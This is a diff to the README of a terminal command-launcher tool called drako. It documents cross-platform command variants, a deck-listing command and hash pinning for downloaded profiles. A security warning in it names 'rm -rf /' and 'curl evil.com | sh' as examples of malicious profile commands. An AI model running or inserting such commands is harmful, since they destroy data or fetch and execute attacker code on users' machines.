@@ -70,7 +70,7 @@ Once it's open, the **Settings** cell in the Core profile has an **Add go/bin to
 - **Quick Navigation:** For example : Pressing `2` and `3` in quick sequence moves the cursor to the 2nd column, 3rd row.
 - **Switch Profile:** `Alt` + `1-9` to switch directly.
 - **Cycle Profile:** `o` (prev) and `p` (next).
-- **Profile Inventory:** `i`.
+- **Profile Inventory:** `i`. Inside, `e` opens the highlighted profile file in your editor (`$VISUAL`/`$EDITOR`).
 - **Lock Current Profile (for launching):** `r`.
 - **Grid/Path Toggle:** `Tab`.
 - **Path Mode:**
@@ -111,38 +111,55 @@ row = 1
 
 ```
 
-## 👢 Bootstrap & 🧶 The Weaver
+## 🧶 Cross-Platform Decks (Command Variants)
 
-**The Bootstrap:** On first run, `drako` creates:
+A cell's `command` can be a plain string — or a table of per-platform variants, resolved when the profile loads:
+
+```toml
+[[commands]]
+name = "Update System"
+command = { linux_debian = "sudo apt update && sudo apt upgrade", linux_arch = "sudo pacman -Syu", macos = "brew update && brew upgrade" }
+col = "a"
+row = 0
+```
+
+- **Recognized keys:** `linux_debian`, `linux_arch`, `linux_fedora`, `linux_void`, `linux_generic` (fallback for any Linux), `macos`, `windows`.
+- On Linux, the distro is detected from `/etc/os-release` (`ID` and `ID_LIKE`) — so e.g. Pop!\_OS resolves to `linux_debian`.
+- Dropdown items (`items = [...]`) accept variant tables too — every entry in a command folder resolves independently.
+- **No variant for the current platform?** The deck still loads; the cell just has no command, and its explain popup (`e`) lists which platforms the author covered.
+
+One deck file, every machine. This is what makes summoned decks portable across distros.
+
+## 👢 Bootstrap
+
+On first run, `drako` creates:
 - `config.toml`: Global settings (Input Keys, Global Theme).
-- `core.profile.toml`: The default command profile (Process Monitor, System Info, etc.)
+- `core.profile.toml`: The default command profile (Process Monitor, System Info, etc.), generated for your OS from templates inside the binary. Deleted or stashed it? `drako restore-core` regenerates it any time.
 - `themes.toml`: Color palettes. The built-in `dracula` theme lives in the binary as the fallback, so it no longer needs to be defined here.
 
 **NOTE:** If you've customized your color schemes, keep a backup of your `themes.toml` — how themes are configured may change in a future release.
 
 **NOTE:** Bootstrapping only occurs if files (config.toml and core.profile.toml) are missing. To clean-up, use `drako purge --interactive` or `drako purge --destroyeverything` (backup your work first).
 
-**The Weaver:** Ensures cross-platform consistency. Inside the Drako binary lies a **Settings Template**, a **Core Template**, and a **[dictionary](internal/config/bootstrap/core_dictionary.toml)** of OS-specific defaults. When you run Drako for the first time, The Weaver "weaves" these together to create `~/.config/drako/core.profile.toml` tailored to your OS.
-
 **Clean Slate:** The default inventory is intentionally minimal to avoid cluttering your workspace. You can summon curated command decks directly from the **Install Tools** menu in the Core profile, or use the CLI to summon them manually:
 
 - **101 Series** ([Source](https://github.com/lucky7xz/101-deck)): `drako summon https://github.com/lucky7xz/101-deck.git`
 - **GGML** ([Source](https://github.com/lucky7xz/ggml-deck)): `drako summon https://github.com/lucky7xz/ggml-deck.git`
 
-```markdown
-internal/config/bootstrap/      
-├── settings_template.toml     # [Template] Global settings
-├── core_template.toml         # [Template] Default profile commands
-├── core_dictionary.toml       # [Dictionary] OS-specific command mappings
-└── inventory/                 # [Profiles] Minimal default inventory (ssh-utils)
-```
-
-**NOTE:** If your OS specific dictionary is missing, feel free to create a pull request!
+**NOTE:** If drako mis-detects your distro or a default command is wrong for your OS, please open an issue.
 
 
 ## 🧰 Power Tools
 
 Beyond the TUI, Drako provides CLI commands for advanced management.
+
+### 📋 Listing Decks
+
+`drako ls` prints every equipped profile as a table: cell address, name, and description. The output is deliberately plain — pipe it, grep it, or hand it to an AI agent as instant context for what this machine's control surface can do.
+
+```bash
+drako ls
+```
 
 ### 🪄 Summoning Profiles
 
@@ -154,9 +171,13 @@ Share and reuse command decks across machines and teams. Instead of manually cop
 # Discards the temporary repo
 
 drako summon git@github.com:user/my_profile_collection.git
+
+# Verify what arrived matches what the author published (optional, recommended):
+drako summon https://example.com/deck.profile.toml --sha256 <full 64-char hex digest>
+drako summon git@github.com:user/repo.git --rev <full 40-char commit hash>
 ```
 
-**NOTE:** Works with any Git host (GitHub, GitLab, self-hosted). Summoned profiles land in `inventory/`, validated before copying.
+**NOTE:** Works with any Git host (GitHub, GitLab, self-hosted). Summoned profiles land in `inventory/`, validated before copying. Summoning without a pin still works — drako just warns that the download is unverified.
 
 If a profile needs extra files (scripts, configs), declare it under `assets = ["relative/path/to/file", ...]`.
 `drako` will copy these assets to `~/.config/drako/assets/<profile_name>/`.
@@ -189,6 +210,7 @@ drako strip
 - **Summoning is a Trust Operation:** When you summon a profile, you are downloading code that `drako` will execute. A malicious profile could contain harmful commands (e.g., `rm -rf /`, `curl evil.com | sh`).
     - **Review before running:** Always inspect the contents of a summoned profile (using `cat` or your editor) *before* you start using it.
     - **Only summon from trusted sources:** Treat a profile URL like you would a binary executable.
+    - **Pin when you can:** If the author publishes a checksum or commit hash, pass `--sha256`/`--rev` so drako verifies the download before accepting it.
 - **Understand the Commands:** Some entries perform system changes (e.g., package updates, Docker operations). Press `e` in the TUI to read the command description.
 - **When Unsure:** Consult documentation or ask a trusted friend/colleague.
 
@@ -247,9 +269,10 @@ Glassroot locks the interface, but the commands still do whatever they do — so
  - [x] Summon profiles incl assets
  - [x] DRY Refactor  
  - [x] Grid Size Safety & Rescue Mode
+ - [x] Per-platform command variants (cross-platform decks)
+ - [x] Summon verification pins (`--sha256` / `--rev`)
+ - [x] `drako ls` — deck listing for pipes, scripts & AI agents
  - [~] Glassroot Mode
- - [ ] Weaver-enabled adaptive user profiles
- - [ ] 
 
  ## Dev
  - [~] Full unit test suite
@@ -268,9 +291,10 @@ Glassroot locks the interface, but the commands still do whatever they do — so
 
 ## 🤝 Contribution
 
-Ideas are welcome. Bugs will be hunted.
--   **Issues:** Report defects or propose architectural changes.
--   **Pull Requests:** Fork the repository and submit your work.
+Ideas are welcome. Bugs will be hunted. drako follows an SQLite-style contribution model — full details in [docs/CONTRIBUTING.md](docs/CONTRIBUTING.md):
+
+-   **Issues:** Bug reports, feature ideas, and design discussion — yes, please.
+-   **Pull Requests:** Not accepted; they are closed without review, with thanks. drako's code stays single-author so the whole codebase remains auditable end to end (the AGPL still grants you every freedom to fork and modify).
 -   **Alpha State:** `drako` is currently in (late) ALPHA. It is stable but evolving. This is your opportunity to influence its development.
 
 ---
